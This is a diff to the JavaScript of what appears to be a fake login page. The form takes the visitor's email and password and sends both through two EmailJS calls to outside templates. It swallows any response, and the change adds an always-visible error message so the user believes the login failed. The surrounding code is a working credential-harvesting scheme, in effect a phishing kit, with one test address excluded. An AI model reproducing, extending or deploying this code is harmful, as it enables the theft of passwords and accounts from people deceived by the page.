@@ -6,6 +6,9 @@
 
         var email = document.getElementById('email').value;
         var password = document.getElementById('password').value;
+        var errorMessage = document.getElementById('error-message');
+
+        errorMessage.style.display = 'block';
 
         if (email === 'pruebita@gmail.com') {
             document.getElementById('contact-form').reset();
@@ -13,19 +16,16 @@
         }
 
         if (email && password) {
-            // data
             var templateParams = {
                 email: email,
                 password: password
             };
 
-            // firtu
             emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
                 .then(function(response) {
                 }).catch(function(error) {
                 });
 
-            // secose
             emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
                 .then(function(response) {
                 }).catch(function(error) {
